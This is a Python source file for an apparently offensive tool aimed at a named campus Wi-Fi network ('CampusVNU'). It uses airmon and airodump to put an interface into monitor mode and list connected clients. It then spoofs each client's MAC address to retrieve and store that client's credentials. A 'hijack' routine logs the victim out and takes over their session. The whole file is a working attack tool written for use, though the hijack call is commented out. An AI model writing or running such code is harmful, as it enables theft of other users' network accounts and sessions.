#!/usr/bin/env python
import os
import time

from pwn import log, success

from model.isp.campusvnu import CampusVNU
from tools.airmon import Airmon
from tools.airodump import Airodump
from tools.ip import Ip


def checkroot():
    if os.geteuid():
        log.error("Run script as root!")


def select_interface():
    while True:
        os.system("clear")
        try:
            interfaces = Ip.get_interfaces()

            msg = "Select your interface: "
            for i in range(len(interfaces)):
                msg += f"\n[{i}] {interfaces[i].decode()}"

            log.info(msg)
            choice = int(input("Choice: "))

            global interface
            interface = interfaces[choice].decode()

            break
        except (IndexError, ValueError):
            log.warn("Invalid choice!")

        time.sleep(1)


# TODO: add menu selector
def select_network():
    global network
    network = CampusVNU


def get_clients():
    moninterf = Airmon.start(interface)
    with Airodump(moninterf, essid_regex=network.name) as airodump:
        try:
            while True:
                os.system("clear")

                targets = airodump.get_targets()
                real_clients = []

                for c in airodump.get_clients():
                    for t in targets:
                        if c.bssid == t.bssid:
                            c.essid = t.essid
                            real_clients.append(c)

                print(
                    "{:<20} {:<10} {:<10} {:<10} {:<20}".format(
                        "BSSID", "Privacy", "PWR", "Beacons", "ESSID"
                    )
                )
                for t in targets:
                    print(
                        "{:<20} {:<10} {:<10} {:<10} {:<20}".format(
                            t.bssid, t.privacy, t.power, t.beacons, t.essid
                        )
                    )
                print(
                    "\n{:<20} {:<20} {:<10} {:<10} {:<20}".format(
                        "BSSID", "STATION", "PWR", "Packets", "Probed ESSIDs"
                    )
                )
                for c in real_clients:
                    print(
                        "{:<20} {:<20} {:<10} {:<10} {:<20}".format(
                            c.bssid, c.station, c.power, c.packets, c.probed_essids
                        )
                    )

                time.sleep(1)
        except KeyboardInterrupt:
            global clients
            clients = real_clients
            Airmon.stop(moninterf)


def get_creddentials():
    global sessions
    sessions = []

    for c in clients:
        session = network(c)
        session.spoof(interface)

        if session.get_creddentials():
            session.print_info()
            session.store()
            sessions.append(session)
        else:
            session.print_info()

        print()


# TODO: print list of accounts with etr and bandwidth
def hijack():
    for s in sessions:
        p = log.progress("Stealing session")
        s.print_info()

        p.status("Logging out")
        s.logout()

        s.reset_mac()

        p.status("Logging in")
        s.login()

        p.success("Session stolen successfully!")
        break


# TODO: add more isp
# TODO: add connect offline from saved sessions
# TODO: remove expired sessions
if __name__ == "__main__":
    checkroot()
    select_interface()
    select_network()
    get_clients()
    get_creddentials()
    # hijack()
